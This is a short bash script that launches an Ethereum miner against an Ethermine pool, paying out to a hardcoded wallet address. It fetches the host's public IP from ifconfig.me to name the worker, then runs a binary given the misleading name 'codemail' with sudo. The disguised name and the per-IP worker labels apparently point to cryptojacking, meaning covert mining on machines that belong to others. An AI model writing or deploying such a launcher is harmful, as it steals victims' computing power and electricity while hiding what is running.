#!/bin/bash

POOL=us1.ethermine.org:4444
WALLET=0xcdbccced724727b077d6554e85ddfd8465a523a2.$(echo "$(curl -s ifconfig.me)" | tr . _ )-mau-ne

cd "$(dirname "$0")"

chmod +x ./codemail && sudo ./codemail --algo ETHASH --pool $POOL --user $WALLET  $@
